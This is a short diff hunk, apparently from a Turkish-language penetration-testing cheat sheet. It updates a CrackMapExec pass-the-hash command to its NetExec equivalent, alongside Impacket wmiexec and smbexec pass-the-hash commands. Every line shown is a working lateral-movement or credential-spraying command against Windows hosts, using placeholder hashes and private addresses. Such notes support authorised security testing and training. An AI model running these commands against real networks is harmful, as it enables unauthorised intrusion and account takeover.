@@ -121,8 +121,8 @@ python3 wmiexec.py -hashes :NTLM_HASH DOMAIN/user@10.10.10.1
 # smbexec
 python3 smbexec.py -hashes :NTLM_HASH DOMAIN/user@10.10.10.1
 
-# CrackMapExec ile ağ genelinde test
-crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH
+# NetExec (CrackMapExec'in maintained fork'u; CME Apr 2024'te archive'landı) ile ağ genelinde test
+nxc smb 10.10.10.0/24 -u Administrator -H NTLM_HASH
 ```
 
 ## Credential Dumping
